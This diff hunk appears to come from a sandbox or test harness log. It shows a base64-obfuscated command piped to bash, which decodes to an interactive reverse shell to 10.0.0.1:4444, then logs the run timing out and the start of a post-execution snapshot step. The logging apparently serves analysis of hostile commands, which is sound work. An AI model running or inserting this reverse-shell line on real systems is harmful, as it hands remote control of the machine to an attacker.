@@ -78,3 +78,16 @@ everything's installed!
 
   $ echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash
   ────────────────────────────────────────────────────────────
+
+  耗时     : 134.5s
+  退出码   : 1
+  stdout   : 0 行
+  stderr   : 2 行
+
+  --- stderr (前 30 行) ---
+    | bash: connect: Connection timed out
+    | bash: line 1: /dev/tcp/10.0.0.1/4444: Connection timed out
+
+============================================================================
+  5/9  采集执行后快照 (全维度)
+============================================================================
